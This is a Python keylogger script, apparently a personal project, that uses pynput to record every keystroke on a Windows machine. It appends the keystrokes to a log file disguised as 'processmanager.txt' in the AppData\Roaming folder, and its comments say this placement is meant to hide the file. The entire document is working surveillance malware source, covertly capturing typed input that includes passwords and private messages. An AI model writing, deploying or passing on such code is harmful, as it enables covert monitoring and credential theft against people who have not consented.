import os
from pynput.keyboard import Listener

keys = []
count = 0
#path = 'processmanager.txt'
# this creates the file in the directory where code is which is easily accessible. Ex: C:\Users\Tarun\PycharmProjects\PythonProject\.venv
#To hide the file, we go to cmd and in our user directory we open AppData and the new file gets created under Roaming
#To access the file, go to cmd->cd AppData-> cd Roaming->filename
path = os.environ['appdata'] + '\\processmanager.txt'

def on_press(key):
    global keys, count #python knows we are using global variables and not local

    keys.append(key)
    count += 1

    if count >=1:
        count=0
        write_file(keys)
        keys = []#list is emptied because we dont want a repetition of entries

def write_file(keys):
    with open(path, 'a') as f:#append is used to prevent overwriting of file contents
        for key in keys:
            k = str(key).replace("'", "") #by default pynput will print keys one by one separated by '
            if k.find('backspace') > 0:
                f.write(' Backspace ')
            elif k.find('enter') > 0:
                f.write('\n')
            elif k.find('shift') > 0:
                f.write(' Shift ')
            elif k.find('space') > 0:
                f.write(' ')
            elif k.find('caps_lock') > 0:
                f.write(' Caps_Lock ')
            elif k.find('numpad') > 0:
                f.write(' NumPad ')
            elif k.find('tab') > 0:
                f.write(' Tab ')
            elif k.find('escape') > 0:
                f.write(' Escape ')
            elif k.find('delete') > 0:
                f.write(' Delete ')
            elif k.find('pgup') > 0:
                f.write(' pgup ')
            elif k.find('pgdn') > 0:
                f.write(' pgdn ')
            elif k.find('home') > 0:
                f.write(' Home ')
            elif k.find('end') > 0:
                f.write(' End ')


            elif k.find('ctrl') > 0:
                f.write(' Control ')
            elif k.find('alt') > 0:
                f.write(' Alt ')
            elif k.find('Key'):
                f.write(k)



with Listener(on_press=on_press) as Listener:
    Listener.join()
